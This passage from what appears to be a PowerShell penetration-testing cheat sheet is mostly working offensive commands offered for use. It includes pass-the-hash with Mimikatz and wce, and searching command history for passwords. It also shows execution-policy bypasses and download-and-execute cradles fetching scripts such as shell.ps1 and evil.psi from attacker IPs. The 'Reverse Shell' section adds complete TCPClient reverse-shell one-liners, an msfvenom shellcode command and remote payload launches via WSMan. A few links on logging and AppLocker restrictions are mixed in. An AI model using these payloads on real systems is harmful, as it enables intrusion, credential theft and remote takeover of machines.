<li>List all available modules: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Module</span> <span class="o">-</span><span class="n">ListAvailable</span> <span class="o">-</span><span class="k">All</span></code><ul>
<li>List all modules available in: <code class="codehilite"><span class="err">$</span><span class="n">env</span><span class="p">:</span><span class="n">PSModulePath</span></code></li>
</ul>
</li>
<li>All functions exposed by a module: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">Module</span> <span class="o">&lt;</span><span class="n">module_name</span><span class="o">&gt;</span></code></li>
</ul>
</li>
<li>Command History (PSReadline)<ul>
<li><code class="codehilite"><span class="n">cat</span> <span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span> <span class="o">|</span> <span class="n">sls</span> <span class="n">password</span></code></li>
<li>By default, the path is: <code class="codehilite"><span class="n">profile</span><span class="p">:</span><span class="err">\</span><span class="n">AppData</span><span class="err">\</span><span class="n">Roaming</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">PowerShell</span><span class="err">\</span><span class="n">PSReadline</span><span class="err">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span></code></li>
</ul>
</li>
<li>System Information<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">HotFix</span></code></li>
</ul>
</li>
<li>Jobs<ul>
<li>Run job on a remote machine using <code class="codehilite"><span class="n">PSSession</span></code> or by using <code class="codehilite"><span class="o">-</span><span class="n">AsJob</span></code> with <code class="codehilite"><span class="o">-</span><span class="n">ComputerName</span></code>. With <code class="codehilite"><span class="o">-</span><span class="n">AsJob</span></code> it's possible to see remote jobs using <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Job</span></code>.
  <div class="codehilite"><pre><span></span><span class="k">Start</span><span class="o">-</span><span class="n">Job</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="n">whoami</span><span class="err">}</span>
<span class="k">Start</span><span class="o">-</span><span class="n">Job</span> <span class="o">-</span><span class="n">FilePath</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span>

<span class="k">Get</span><span class="o">-</span><span class="n">Job</span> <span class="o">|</span> <span class="n">Receive</span><span class="o">-</span><span class="n">Job</span>
<span class="k">Get</span><span class="o">-</span><span class="n">Job</span> <span class="o">-</span><span class="n">id</span> <span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span> <span class="o">|</span> <span class="n">Receive</span><span class="o">-</span><span class="n">Job</span>
<span class="n">Remove</span><span class="o">-</span><span class="n">Job</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ParameterName</span> <span class="n">AsJob</span>
</pre></div></li>
</ul>
</li>
<li>Directory search:<code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">HttpStatus</span></code></li>
<li>Pass the Hash with Powershell<ul>
<li><a href="http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html">http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html</a>
  <div class="codehilite"><pre><span></span><span class="p">.</span><span class="err">\</span><span class="n">wce</span><span class="p">.</span><span class="n">exe</span> <span class="err">–</span><span class="n">s</span> <span class="o">&lt;</span><span class="n">Administrator</span><span class="p">:.:</span><span class="n">hashes</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">c</span> <span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span>

<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="ss">&quot;&#39;&quot;</span><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="k">domain</span><span class="p">:.</span> <span class="o">/</span><span class="n">ntlm</span><span class="p">:</span><span class="o">&lt;</span><span class="n">ntlmhash</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">run</span><span class="p">:</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="err">&#39;</span><span class="ss">&quot;&quot;</span>
</pre></div></li>
</ul>
</li>
<li>Persistence<ul>
<li>WMI permanent event consumers</li>
<li>Windows registry</li>
<li>Scheduled tasks</li>
</ul>
</li>
<li>Restricting Powershell<ul>
<li><a href="http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html">http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html</a></li>
<li>Process tracking and Module logging.</li>
<li>ACL, Software Restriction Policies (SRP) and Application Control Policies (Applocker) could be used to control PowerShell.                                                                          <ul>
<li>Both aresupported by GPO, your mileage may vary according to your implementation preferences.</li>
<li><code class="codehilite"><span class="n">__PSLockDownPolicy</span></code> (v3 only)</li>
</ul>
</li>
<li>Just Enough Admin – Restrict Administrative Rights - <a href="http://blogs.technet.com/b/privatecloud/archive/2014/05/14/just-enough-administration-step-by-step.aspx">http://blogs.technet.com/b/privatecloud/archive/2014/05/14/just-enough-administration-step-by-step.aspx</a></li>
<li>Auditing, Base lining and Incident Management<ul>
<li>PoshSec - <a href="https://github.com/PoshSec">https://github.com/PoshSec</a></li>
<li>Kansa - <a href="https://github.com/davehull/Kansa">https://github.com/davehull/Kansa</a></li>
<li>Voyeur - <a href="https://github.com/silverhack/voyeur/">https://github.com/silverhack/voyeur/</a></li>
<li>Using Virus Total API - <a href="https://github.com/darkoperator/Posh-VirusTotal">https://github.com/darkoperator/Posh-VirusTotal</a></li>
</ul>
</li>
<li>Investigating PowerShell attacks <a href="https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks-UPDATED.pdf">https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks-UPDATED.pdf</a></li>
</ul>
</li>
<li>Bypass<ul>
<li>Bypassing Applocker Policies - <a href="http://www.sixdub.net/2014/12/02/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/">http://www.sixdub.net/2014/12/02/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/</a></li>
<li>Allowing the execution of Powershell functionality without the use of Powershell.exe (.Net): <a href="https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick">https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick</a></li>
</ul>
</li>
<li>Save output
    <div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Service</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">CSV</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Temp</span><span class="err">\</span><span class="n">AllServices</span><span class="p">.</span><span class="n">CSV</span> <span class="err">–</span><span class="n">NoTypeInfo</span>
<span class="k">Get</span><span class="o">-</span><span class="k">User</span> <span class="err">–</span><span class="n">Filter</span> <span class="err">‘</span><span class="n">Name</span> <span class="err">–</span><span class="k">Like</span> <span class="err">“</span><span class="o">*</span><span class="n">John</span><span class="err">”’</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">CSV</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Temp</span><span class="err">\</span><span class="n">AllUsers</span><span class="p">.</span><span class="n">CSV</span> <span class="err">–</span><span class="n">NoTypeInfo</span>
<span class="k">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="err">–</span><span class="n">Path</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">CSV</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Temp</span><span class="err">\</span><span class="n">AllFiles</span><span class="p">.</span><span class="n">CSV</span> <span class="o">-</span><span class="n">NoTypeInfo</span>
</pre></div></li>
<li>Reboots: <code class="codehilite"><span class="x">Get-EventLog –Log System –Newest 100 | Where-Object </span><span class="cp">{</span><span class="nv">$_.EventID</span> <span class="err">–</span><span class="na">eq</span> <span class="err">‘</span><span class="m">1074</span><span class="err">’</span><span class="cp">}</span><span class="x"> | FT MachineName, UserName, TimeGenerated -AutoSize</span></code></li>
<li>Search hotfix: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">HotFix</span> <span class="err">–</span><span class="n">ID</span> <span class="n">KB2877616</span></code></li>
<li>Backup Group Policy: <code class="codehilite"><span class="n">Backup</span><span class="o">-</span><span class="n">GPO</span> <span class="err">–</span><span class="k">All</span> <span class="err">–</span><span class="n">Path</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Temp</span><span class="err">\</span><span class="n">AllGPO</span></code></li>
<li>Check if all DCs are Global Catalog Servers: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADDomainController</span> <span class="err">–</span><span class="n">Filter</span> <span class="o">*</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">Hostname</span><span class="p">,</span> <span class="n">IsGlobalCatalog</span></code></li>
<li>Powershell with HID<ul>
<li><a href="https://github.com/samratashok/Kautilya/">https://github.com/samratashok/Kautilya/</a></li>
<li><a href="http://www.labofapenetrationtester.com/search/label/Kautilya">http://www.labofapenetrationtester.com/search/label/Kautilya</a></li>
<li><a href="http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices">http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices</a></li>
</ul>
</li>
<li>TCP / UDP / WMI Shells: <a href="https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</a></li>
</ul>
<h2 id="download-files">Download Files<a class="headerlink" href="#download-files" title="Permanent link">&para;</a></h2>
<p><div class="codehilite"><pre><span></span><span class="n">powershell</span> <span class="nb">wget </span><span class="s2">&quot;http://example.com/abc.txt&quot;</span> <span class="n">-outfile</span> <span class="s2">&quot;abc.txt&quot;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://192.168.0.17/PS_TCP4.ps1&quot;</span> <span class="n">-OutFile</span> <span class="nv">$fullpath</span><span class="p">;</span>
</pre></div>
<div class="codehilite"><pre><span></span>powershell -c <span class="s2">&quot;Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&quot;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="k">echo</span> $webclient = New-Object System.Net.WebClient <span class="p">&gt;</span>wget.ps1
<span class="k">echo</span> $url = <span class="s2">&quot;http://10.10.10.10/example.exe&quot;</span> <span class="p">&gt;&gt;</span>wget.ps1
<span class="k">echo</span> $file = <span class="s2">&quot;example.exe&quot;</span> <span class="p">&gt;&gt;</span>wget.ps1
<span class="k">echo</span> $webclient.DownloadFile($url,$file) <span class="p">&gt;&gt;</span>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File wget.ps1
</pre></div></p>
<ul>
<li>Base64 encoded payload delivery
    <div class="codehilite"><pre><span></span><span class="k">echo</span> <span class="s2">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://172.16.67.128:80/6WcepYO&#39;)&quot;</span> <span class="p">|</span> iconv --to-code UTF-16LE <span class="p">|</span> base64 -w 0
</pre></div>
    <div class="codehilite"><pre><span></span>kaliwmis-32 -U administrator%badpassword //10.10.10.10 <span class="s2">&quot;cmd.exe /c  powershell.exe -nop -enc &lt;base64-value&gt;&quot;</span>
</pre></div></li>
</ul>
<h2 id="execution-policy">Execution Policy<a class="headerlink" href="#execution-policy" title="Permanent link">&para;</a></h2>
<ul>
<li>Not a security feature</li>
<li>Used to avoid accidental script execution</li>
<li>Can be bypass with:<ul>
<li><code class="codehilite"><span class="nv">powershell</span>.<span class="nv">exe</span> <span class="o">-</span><span class="k">exec</span> <span class="nv">Bypass</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">bypass</span> <span class="p">.</span><span class="err">\</span><span class="n">example</span><span class="p">.</span><span class="n">ps1</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="k">c</span> <span class="o">&lt;</span><span class="n">cmd</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">EncodedCommand</span> <span class="o">&lt;</span><span class="n">cmd</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">enc</span> <span class="o">&lt;</span><span class="n">cmd</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="err">$</span><span class="n">env</span><span class="p">:</span><span class="n">PSExecutionPolicyPreference</span><span class="o">=</span><span class="ss">&quot;bypass&quot;</span></code></li>
</ul>
</li>
<li>Ref: <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6</a></li>
<li>15 ways to bypass PowerShell execution policy: <a href="https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy">https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy</a></li>
</ul>
<h2 id="reverse-shell">Reverse Shell<a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html</a>
    <div class="codehilite"><pre><span></span><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="err">“</span><span class="n">powershell</span><span class="err">”</span> <span class="n">-argumentlist</span> <span class="err">“</span><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="err">‘</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">30</span><span class="p">/</span><span class="n">adminshell</span><span class="p">.</span><span class="n">ps1</span><span class="err">’</span><span class="p">)</span><span class="err">”</span> <span class="n">-Credential</span> <span class="nv">$cred</span>

<span class="n">msfvenom</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">Windows</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s2">&quot;powershell -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1&#39;)&quot;</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">unicode_mixed</span> <span class="n">-b</span> <span class="s1">&#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39;</span> <span class="n">BufferRegister</span><span class="p">=</span><span class="n">EAX</span> <span class="o">-f</span> <span class="n">python</span> <span class="p">&gt;</span> <span class="n">shellcode</span>
</pre></div>
    <div class="codehilite"><pre><span></span>powercat -l -v -p 4444 -t 1000
</pre></div>
    <div class="codehilite"><pre><span></span>powershell -e <span class="s2">&quot;&lt;encoded-payload&gt;&quot;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">,</span><span class="n">80</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot;&gt; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nv">$sm</span><span class="p">=(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;192.168.254.1&quot;</span><span class="p">,</span><span class="n">55555</span><span class="p">)).</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bt</span><span class="p">=</span><span class="n">0</span><span class="p">..</span><span class="n">255</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span><span class="p">=</span><span class="nv">$sm</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bt</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$bt</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$d</span><span class="p">=(</span><span class="nb">New-Object</span> <span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bt</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span><span class="nv">$st</span><span class="p">=(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">((</span><span class="nb">iex </span><span class="nv">$d</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span><span class="p">));</span><span class="nv">$sm</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$st</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$st</span><span class="p">.</span><span class="n">Length</span><span class="p">)}</span>
</pre></div></li>
</ul>
<h2 id="remote-script-execution">Remote Script execution<a class="headerlink" href="#remote-script-execution" title="Permanent link">&para;</a></h2>
<p>- <code class="codehilite"><span class="nt">Invoke-Expression</span> <span class="o">(</span><span class="nt">New-Object</span> <span class="nt">Net</span><span class="p">.</span><span class="nc">WebClient</span><span class="o">)</span><span class="p">.</span><span class="nc">DownloadString</span><span class="o">(</span><span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="o">);</span></code>
  - <code class="codehilite"><span class="nt">iex</span> <span class="o">(</span><span class="nt">New-Object</span> <span class="nt">Net</span><span class="p">.</span><span class="nc">WebClient</span><span class="o">)</span><span class="p">.</span><span class="nc">DownloadString</span><span class="o">(</span><span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="o">);</span></code>
  - <code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">EncodedCommand</span> <span class="o">&lt;</span><span class="n">Base64EncodedCommand</span><span class="o">&gt;</span></code>
  - <code class="codehilite"><span class="o">$</span><span class="nt">ie</span><span class="o">=</span><span class="nt">New-Object</span> <span class="nt">-ComObject</span> <span class="nt">InternetExplorer</span><span class="p">.</span><span class="nc">Application</span><span class="o">;$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">visible</span><span class="o">=$</span><span class="nt">False</span><span class="o">;$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">navigate</span><span class="o">(</span><span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="o">);</span><span class="nt">sleep</span> <span class="nt">5</span><span class="o">;$</span><span class="nt">resp</span><span class="o">=$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">Document</span><span class="p">.</span><span class="nc">Body</span><span class="p">.</span><span class="nc">innerHTML</span><span class="o">;$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">quit</span><span class="o">();</span><span class="nt">iex</span> <span class="o">$</span><span class="nt">resp</span></code>
  - <code class="codehilite"><span class="n">iex</span> <span class="p">(</span><span class="n">iwr</span> <span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="p">)</span></code>
  - <code class="codehilite">$<span class="nv">h</span><span class="o">=</span><span class="nv">New</span><span class="o">-</span><span class="nv">Object</span> <span class="o">-</span><span class="nv">ComObject</span> <span class="nv">Msxm12</span>.<span class="nv">XMLHTTP</span><span class="c1">;$h.open(&#39;GET&#39;, &#39;http://192.168.230.1/evil.psi1&#39; ,$false);$h.send();iex $h. responseText</span></code>
  - Craft Download Cradles: <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a>
    <div class="codehilite"><pre><span></span><span class="nb">START </span><span class="p">/</span><span class="n">B</span> <span class="s2">&quot;&quot;</span> <span class="n">powershell</span> <span class="n">-c</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.2/shell.ps1&#39;</span><span class="p">)</span>
<span class="c"># _/B prevents creation of a new window_</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nv">$wr</span> <span class="no">[System.NET.WebRequest]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;http://192.168.230.1/evil.psi&quot;</span><span class="p">)</span>
<span class="nv">$r</span> <span class="p">=</span> <span class="nv">$wr</span><span class="p">.</span><span class="n">GetResponse</span><span class="p">()</span>
<span class="nb">IEX </span><span class="p">(</span><span class="no">[System.IO.StreamReader]</span> <span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">GetResponseStream</span><span class="p">()))</span> <span class="p">.</span><span class="n">ReadToEnd</span><span class="p">()```</span>
</pre></div></p>
<h2 id="powershell-remoting">Powershell Remoting<a class="headerlink" href="#powershell-remoting" title="Permanent link">&para;</a></h2>
<ul>
<li>Enabled by default from Windows Server 2012<ul>
<li><code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">PSRemoting</span> <span class="o">-</span><span class="k">Force</span></code></li>
</ul>
</li>
<li>Admin privileges are required to connect</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">CommandType</span> <span class="n">cmdlet</span> <span class="o">-</span><span class="n">ParameterName</span> <span class="n">computername</span></code></li>
<li><code class="codehilite"><span class="x">Get-Command -CommandType cmdlet | Where-Object </span><span class="cp">{</span><span class="nv">$_Parameters.Keys</span> <span class="o">--</span><span class="na">contains</span> <span class="s1">&#39;ComputerName&#39;</span> <span class="o">-</span><span class="na">and</span> <span class="nv">$_Parameters.Keys</span> <span class="o">--</span><span class="na">contains</span> <span class="s1">&#39;Credential&#39;</span> <span class="o">-</span><span class="na">and</span> <span class="nv">$_Parameters.Keys</span> <span class="o">--</span><span class="na">notcontains</span> <span class="s1">&#39;Session&#39;</span><span class="cp">}</span><span class="x"></span></code></li>
<li>WSMAN (WebServicesManagement) Protocol (WinRM)<ul>
<li>WinRM is Microsoft’s implementation of WSMAN</li>
<li>Port 5985, 5986</li>
<li>If target is in a workgroup, attacker's machine should trust target machine to send out credentials:<ul>
<li>Set-Item  WSMan:\localhost\client\trustedhosts -Value *</li>
</ul>
</li>
<li><code class="codehilite"><span class="x">Invoke-Command -ScriptBlock </span><span class="cp">{</span><span class="nv">$env</span><span class="o">:</span><span class="na">ComputerName</span><span class="cp">}</span><span class="x"> -ComputerName example -Credential dominName/userName</span></code><ul>
<li><code class="codehilite"><span class="o">-</span><span class="n">FilePath</span></code>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-WSManAction</span> <span class="n">-Action</span> <span class="n">Create</span> <span class="n">-ResourceURI</span> <span class="n">wmicimv2</span><span class="p">/</span><span class="n">win32_process</span> <span class="n">-ValueSet</span> <span class="p">@{</span><span class="n">commandline</span><span class="p">=</span><span class="s2">&quot;powershell.exe -c Get-Process&quot;</span><span class="p">}</span> <span class="p">-</span> <span class="n">ComputerName</span> <span class="n">domainpc</span> <span class="err">–</span><span class="n">Credential</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-WSManAction</span> <span class="n">-Action</span> <span class="n">Create</span> <span class="n">-ResourceURI</span> <span class="n">wmicimv2</span><span class="p">/</span><span class="n">win32_process</span> <span class="n">-ValueSet</span> <span class="p">@{</span><span class="n">commandline</span><span class="p">=</span><span class="s2">&quot;powershell.exe -c iex ((New-Object Net.Webclient).DownloadString(&#39;http://192.168.254. 1/reverse_powershell.ps1&#39;))&quot;</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="n">domainpc</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
<li>WSMAN vs PowerShell Remoting vs WMI<ul>
<li>WSMAN<ul>
<li>Firewall friendly</li>
<li>Use HTTP and HTTPS ports</li>
<li>Syntax is complex</li>
<li>Returns immutable objects</li>
<li>Can be used with non-Windows machines</li>
</ul>
</li>
<li>Powershell Remoting<ul>
<li>Firewall friendly</li>
<li>Easy use</li>
<li>Returns immutable objects</li>
</ul>
</li>
<li>WMI<ul>
<li>Not firewall friendly</li>
<li>Not NAT friendly</li>
<li>Complex</li>
<li>Returns editable objects</li>
</ul>
</li>
</ul>
</li>
<li>One to One<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span></code> is stateless for stageful operations use <code class="codehilite"><span class="n">PSSession</span></code><ul>
<li>Interactive, stateful session</li>
<li>Run in a new process <code class="codehilite"><span class="n">wsmprovhost</span></code></li>
</ul>
</li>
<li>New-PSSession<ul>
<li><code class="codehilite"><span class="err">$</span><span class="n">ses</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">PSSession</span></code></li>
<li><code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span></code></li>
</ul>
</li>
<li>Interactive session: <code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">Sessions</span> <span class="err">$</span><span class="n">ses</span></code><ul>
